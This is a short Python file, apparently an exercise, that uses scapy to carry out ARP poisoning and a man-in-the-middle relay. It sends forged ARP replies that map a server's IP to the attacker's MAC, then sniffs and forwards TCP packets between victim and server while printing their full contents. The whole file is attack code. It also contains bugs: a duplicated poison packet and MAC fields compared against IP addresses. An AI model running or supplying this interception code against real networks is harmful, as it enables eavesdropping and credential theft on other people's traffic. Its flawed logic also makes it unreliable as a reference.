import scapy.all as scapy
import time

def arp_poison(ipVictim, macVictim, ipServer, macServer, ipAttacker, macAttacker):

    arp_response_victim = scapy.ARP(op=2, pdst=ipVictim, hwdst=macVictim, psrc=ipServer, hwsrc=macAttacker)
    arp_response_server = scapy.ARP(op=2, pdst=ipVictim, hwdst=macVictim, psrc=ipServer, hwsrc=macAttacker)

    scapy.sendp(scapy.Ether(src=macAttacker, dst=macVictim)/arp_response_victim, verbose=False)
    scapy.sendp(scapy.Ether(src=macAttacker, dst=macServer)/arp_response_server, verbose=False)
    MITM(ipVictim, macVictim, ipServer, macServer)

def listen_arp(IPAttacker, macAttacker):
    while True:
        package = scapy.sniff(filter="arp", count = 1)
        if package[0].op == 1:
            print("Victim is asking for the MAC address of the attacker")
            IpVictim = package[0].psrc
            MacVictim = package[0].hwsrc
            IpServer = package[0].pdst
            MacServer = package[0].hwdst
            arp_poison(IpVictim, MacVictim, IpServer, MacServer, IPAttacker, macAttacker)

def MITM(ipVictim,macVictim, ipServer, macServer):
    #victim to server
    #assume we already tricked the victim and server
    start_time = time.time()
    timeout = 10  # Timeout duration in seconds
    while True:
        #check timeout
        if time.time() - start_time > timeout:
            break
        #sniff request
        package = scapy.sniff(filter="tcp", count = 1)
        if package[0].src == ipVictim:
            #send to server
            scapy.sendp(scapy.Ether(src=macVictim, dst=macServer)/package[0], verbose=False)
            print("Victim to server")
            print(package[0].show())
        elif package[0].src == ipServer:
            #send to victim
            scapy.sendp(scapy.Ether(src=macServer, dst=macVictim)/package[0], verbose=False)
            print("Server to victim")
            print(package[0].show())


